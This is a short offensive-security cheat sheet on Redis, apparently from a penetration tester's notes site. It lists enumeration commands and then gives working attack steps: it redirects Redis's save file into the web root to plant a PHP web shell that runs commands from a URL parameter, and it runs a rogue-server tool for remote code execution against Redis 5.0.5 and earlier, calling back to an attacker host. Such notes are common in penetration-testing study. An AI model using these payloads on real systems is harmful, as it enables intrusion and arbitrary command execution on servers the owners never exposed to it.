---
title: Redis
description: REDIS Methodologies, Tools
---

**`Redis`** is an In-Memory Data Structure store used as a Database, cache, message ber, and Streaming Engine. 


```batch
:: Redis
6379/TCP
```

### Redis Security

Redis does not try to implement **Access Control**, it provides a tiny layer of optional Authentication that is turned ON by Editing the **`redis.conf`** file. The password is set by the System Administrator in **Clear-Text** inside the redis.conf file.


```batch
:: Authenticating in Redis
AUTH <username> <password>
```

<br/>

## Enumeration

```batch
:: Show Database Information
INFO

:: Show Database Configuration
CONFIG GET *

:: Show Connected Clients
client list
```


## PHP Web-Shell

:::caution Only Possible If We Know the `Path` of the Website Folder

:::

```batch
:: Apache PATH
config set dir /var/www/html

:: Filename
config set dbfilename web_shell.php

:: PAYLOAD
set test "<?php system($_GET['cmd']);?>"
save
```

## Redis Rogue Server

:::danger Redis RCE  

Works only on **Version:** **`<=5.0.5`**

:::


- <a class="button button--outline button--info" href="https://github.com/n0b0dyCN/redis-rogue-server">Redis Rogue Server</a>


```batch
redis-rogue-server --rhost <TARGET_IP> --lhost <ATTACKER_IP>
```